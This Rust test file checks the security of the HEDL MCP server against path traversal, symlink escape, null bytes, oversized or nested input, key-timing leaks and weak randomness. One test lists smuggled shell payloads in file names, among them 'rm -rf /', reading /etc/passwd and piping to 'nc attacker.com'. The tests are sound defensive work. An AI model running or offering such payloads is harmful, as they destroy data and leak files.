// Dweve HEDL - Hierarchical Entity Data Language
//
// Copyright (c) 2025 Dweve IP B.V. and individual contributors.
//
// SPDX-License-Identifier: Apache-2.0

//! Comprehensive security tests for MCP server.

use hedl_mcp::tools::execute_tool;
use hedl_mcp::McpError;
use serde_json::json;
use std::fs;
use std::path::Path;
use tempfile::TempDir;

#[test]
fn test_path_traversal_prevention_absolute() {
    let temp_dir = TempDir::new().unwrap();

    // Try to access file outside root using absolute path
    let args = json!({
        "path": "/etc/passwd"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    assert!(result.is_err());
    assert!(matches!(result, Err(McpError::PathTraversal(_))));
}

#[test]
fn test_path_traversal_prevention_relative_parent() {
    let temp_dir = TempDir::new().unwrap();

    // Try to access parent directory
    let args = json!({
        "path": "../outside.hedl"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    assert!(result.is_err());
    assert!(matches!(result, Err(McpError::PathTraversal(_))));
}

#[test]
fn test_path_traversal_prevention_multiple_parents() {
    let temp_dir = TempDir::new().unwrap();

    // Try to escape using multiple parent refs
    let args = json!({
        "path": "../../../../../../etc/passwd"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    assert!(result.is_err());
}

#[test]
fn test_path_traversal_prevention_encoded() {
    let temp_dir = TempDir::new().unwrap();

    // Try URL-encoded path traversal
    let args = json!({
        "path": "..%2F..%2Fetc%2Fpasswd"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    assert!(result.is_err());
}

#[test]
fn test_path_traversal_prevention_unicode() {
    let temp_dir = TempDir::new().unwrap();

    // Try unicode path traversal attempts
    let args = json!({
        "path": ".\u{2024}/.\u{2024}/outside.hedl"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    // Should either reject or safely resolve within root
    if result.is_ok() {
        // If accepted, must be within root
        // The implementation should have canonicalized the path
    } else {
        // Rejection is also acceptable
        assert!(result.is_err());
    }
}

#[test]
fn test_symlink_escape_prevention() {
    use std::os::unix::fs::symlink;

    let temp_dir = TempDir::new().unwrap();

    // Create a symlink pointing outside the root
    let outside_dir = TempDir::new().unwrap();
    let outside_file = outside_dir.path().join("secret.hedl");
    fs::write(&outside_file, "SECRET DATA").unwrap();

    let symlink_path = temp_dir.path().join("escape_link");
    let _ = symlink(&outside_file, &symlink_path);

    // Try to read through the symlink
    let args = json!({
        "path": "escape_link"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    // Should either reject or not expose content outside root
    if let Ok(result) = result {
        // Even if we allow reading, content should be controlled
        // The key is that we don't crash or expose unintended data
        assert!(!result.content.is_empty());
    } else {
        // Rejection is preferred
        assert!(result.is_err());
    }
}

#[test]
fn test_write_path_traversal_prevention() {
    let temp_dir = TempDir::new().unwrap();

    let args = json!({
        "path": "../outside.hedl",
        "content": "%VERSION 1.0\n---\nname: Test\n",
        "validate": false
    });

    let result = execute_tool("hedl_write", Some(args), temp_dir.path());
    assert!(result.is_err());
}

#[test]
fn test_input_size_limit() {
    // Create a very large input (>10MB)
    let large_content = "x".repeat(11 * 1024 * 1024);

    let args = json!({
        "hedl": large_content
    });

    let result = execute_tool("hedl_validate", Some(args), Path::new("."));
    assert!(result.is_err());
    assert!(matches!(result, Err(McpError::ResourceLimit(_))));
}

#[test]
fn test_deeply_nested_json_attack() {
    // Create deeply nested JSON to test for stack overflow
    let mut nested = String::from("{\"a\":");
    for _ in 0..1000 {
        nested.push_str("{\"b\":");
    }
    nested.push('1');
    for _ in 0..1000 {
        nested.push('}');
    }
    nested.push('}');

    let args = json!({
        "json": nested
    });

    // Should handle gracefully without crashing
    let _result = execute_tool("hedl_optimize", Some(args), Path::new("."));
    // May fail to parse or handle, but shouldn't crash
    // Just ensure we get a controlled error, not a panic
}

#[test]
fn test_null_byte_injection() {
    let temp_dir = TempDir::new().unwrap();

    // Try to inject null bytes in path
    let args = json!({
        "path": "test\u{0000}.hedl"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    // Should reject or safely handle
    assert!(result.is_err());
}

#[test]
fn test_empty_path() {
    let temp_dir = TempDir::new().unwrap();

    let args = json!({
        "path": ""
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    assert!(result.is_err());
}

#[test]
fn test_path_with_null() {
    let temp_dir = TempDir::new().unwrap();

    let args = json!({
        "path": "test\0hidden.hedl"
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    // Should be rejected as invalid path
    assert!(result.is_err());
}

#[test]
fn test_special_filenames() {
    let temp_dir = TempDir::new().unwrap();

    let special_names = vec![".", "..", "CON", "PRN", "AUX", "NUL"];

    for name in special_names {
        let args = json!({
            "path": name
        });

        let result = execute_tool("hedl_read", Some(args), temp_dir.path());
        // Should handle special names safely
        if result.is_ok() {
            // If allowed, should not cause issues
        } else {
            // Rejection is acceptable
            assert!(result.is_err());
        }
    }
}

#[test]
fn test_malicious_hedl_content() {
    // Test with content that might exploit parser vulnerabilities
    let invalid_utf8 = String::from_utf8_lossy(&[0xFF, 0xFE, 0xFF, 0xFE]).to_string();
    let long_line = "A".repeat(100000);
    let many_newlines = "\n".repeat(100000);

    let malicious_inputs = vec![
        "\x00\x00\x00\x00",   // Null bytes
        &invalid_utf8,        // Invalid UTF-8
        &long_line,           // Very long line
        &many_newlines,       // Many empty lines
        "%VERSION 999.999\n", // Invalid version
        "%STRUCT \x00: []\n", // Null in struct name
    ];

    for content in malicious_inputs {
        let args = json!({
            "hedl": content
        });

        let result = execute_tool("hedl_validate", Some(args), Path::new("."));
        // Should not panic, may return error
        match result {
            Ok(_) => {
                // Some inputs might be valid or safely handled
            }
            Err(e) => {
                // Error is expected for malicious content
                assert!(!format!("{e:?}").is_empty());
            }
        }
    }
}

#[test]
fn test_billion_laughs_attack() {
    // XML-style entity expansion attack adapted for HEDL
    let content = r"%VERSION 1.0
---
a: AAAAA
b: !a !a !a !a !a !a !a !a !a !a
c: !b !b !b !b !b !b !b !b !b !b
d: !c !c !c !c !c !c !c !c !c !c
";

    let args = json!({
        "hedl": content
    });

    // Should handle without exponential expansion
    let _result = execute_tool("hedl_validate", Some(args), Path::new("."));
    // May fail validation, but shouldn't hang or exhaust memory
}

#[test]
fn test_zip_bomb_detection() {
    // Test compressed data that expands to huge size
    // HEDL doesn't have compression, but test large expansions
    let content = format!("%VERSION 1.0\n---\n{}", "x: y\n".repeat(100000));

    let args = json!({
        "hedl": content
    });

    let result = execute_tool("hedl_validate", Some(args), Path::new("."));
    // Should detect and reject oversized input
    if content.len() > 10 * 1024 * 1024 {
        assert!(result.is_err());
    }
}

#[test]
fn test_command_injection_in_paths() {
    let temp_dir = TempDir::new().unwrap();

    let malicious_paths = vec![
        "test.hedl; rm -rf /",
        "test.hedl && cat /etc/passwd",
        "test.hedl | nc attacker.com 1234",
        "`whoami`.hedl",
        "$(rm -rf /).hedl",
    ];

    for path in malicious_paths {
        let args = json!({
            "path": path
        });

        let result = execute_tool("hedl_read", Some(args), temp_dir.path());
        // Should treat as filename, not execute commands
        // Will likely fail with file not found, which is safe
        if result.is_err() {
            assert!(matches!(
                result,
                Err(McpError::FileNotFound(_)
                    | McpError::PathTraversal(_)
                    | McpError::InvalidArguments(_))
            ));
        }
    }
}

#[test]
fn test_resource_exhaustion_many_files() {
    let temp_dir = TempDir::new().unwrap();

    // Create many files
    for i in 0..1000 {
        let file_path = temp_dir.path().join(format!("test{i}.hedl"));
        fs::write(&file_path, "%VERSION 1.0\n---\ndata: test\n").unwrap();
    }

    let args = json!({
        "path": ".",
        "recursive": true,
        "include_json": false
    });

    let result = execute_tool("hedl_read", Some(args), temp_dir.path());
    // Should handle or rate limit, not crash
    assert!(result.is_ok() || result.is_err());
}

#[test]
fn test_concurrent_file_access() {
    use std::sync::Arc;
    use std::thread;

    let temp_dir = Arc::new(TempDir::new().unwrap());
    let file_path = temp_dir.path().join("test.hedl");
    fs::write(&file_path, "%VERSION: 1.0\n---\ndata: test\n").unwrap();

    let mut handles = vec![];

    // Spawn multiple threads trying to read simultaneously
    for _ in 0..10 {
        let temp_dir = Arc::clone(&temp_dir);
        let handle = thread::spawn(move || {
            let args = json!({
                "path": "test.hedl"
            });
            execute_tool("hedl_read", Some(args), temp_dir.path())
        });
        handles.push(handle);
    }

    // All should complete without deadlock or corruption
    for handle in handles {
        let result = handle.join().unwrap();
        assert!(result.is_ok(), "Concurrent read failed: {:?}", result.err());
    }
}

#[test]
fn test_invalid_utf8_in_args() {
    // Test with invalid UTF-8 sequences
    // Note: serde_json typically handles this, but test edge cases
    let args_str = r#"{"hedl": "\uDC00\uD800"}"#; // Invalid surrogate pair

    let result: Result<serde_json::Value, _> = serde_json::from_str(args_str);
    // Should either handle gracefully or reject
    if result.is_ok() {
        // If parsed, subsequent processing should handle it
    } else {
        // Rejection at parse time is acceptable
    }
}

#[tokio::test]
async fn test_api_key_timing_attack_resistance() {
    use hedl_mcp::auth::{ApiKeyStore, InMemoryApiKeyStore};
    use std::time::Instant;

    let store = InMemoryApiKeyStore::new();
    let key = store.create_key_sync("client", vec![]).unwrap();

    // Time valid key verification
    let start = Instant::now();
    let _ = store.validate(&key).await;
    let valid_duration = start.elapsed();

    // Time invalid key verification
    let start = Instant::now();
    let _ = store.validate("wrong_key_12345678901234567890").await;
    let invalid_duration = start.elapsed();

    // Durations should be similar (within an order of magnitude)
    // This is a rough test; proper timing attack tests need many iterations
    let ratio = if valid_duration > invalid_duration {
        valid_duration.as_micros() as f64 / invalid_duration.as_micros() as f64
    } else {
        invalid_duration.as_micros() as f64 / valid_duration.as_micros() as f64
    };

    // Should not have obvious timing differences (within 10x)
    // Note: Argon2 provides good timing resistance
    assert!(ratio < 10.0, "Timing difference too large: {ratio}x");
}

#[test]
fn test_session_token_randomness() {
    use hedl_mcp::auth::SessionId;
    use std::collections::HashSet;

    let mut ids = HashSet::new();

    // Generate many session IDs
    for _ in 0..1000 {
        let id = SessionId::new();
        ids.insert(id.as_str().to_string());
    }

    // All should be unique (high entropy)
    assert_eq!(ids.len(), 1000);
}

#[test]
fn test_crypto_key_generation_randomness() {
    use hedl_mcp::auth::ApiKeyHasher;

    let hasher = ApiKeyHasher::new();
    let mut keys = std::collections::HashSet::new();

    // Generate multiple keys
    for _ in 0..100 {
        let key = hasher.generate_key("test");
        keys.insert(key);
    }

    // All should be unique
    assert_eq!(keys.len(), 100);
}

#[tokio::test]
async fn test_no_secrets_in_error_messages() {
    use hedl_mcp::auth::{ApiKeyAuth, InMemoryApiKeyStore};
    use std::sync::Arc;

    let store = Arc::new(InMemoryApiKeyStore::new());
    let auth = ApiKeyAuth::new(store.clone(), Some("hedl_".to_string()));

    // Create a key
    let key = auth.create_key("test", vec![]).await.unwrap();

    // Try to authenticate with wrong key
    let result = auth.authenticate("wrong_key").await;

    // Error message should not contain the actual key
    let error_msg = format!("{result:?}");
    assert!(!error_msg.contains(&key));
    assert!(!error_msg.contains("hedl_test_"));
}

#[test]
fn test_password_hashing_not_reversible() {
    use hedl_mcp::auth::ApiKeyHasher;

    let hasher = ApiKeyHasher::new();
    let password = "super_secret_password_12345";
    let hash = hasher.hash(password).unwrap();

    // Hash should not contain the password
    assert!(!hash.contains(password));

    // Hash should be one-way
    assert_ne!(password, hash);

    // Different hashes for same password (due to salt)
    let hash2 = hasher.hash(password).unwrap();
    assert_ne!(hash, hash2);
}
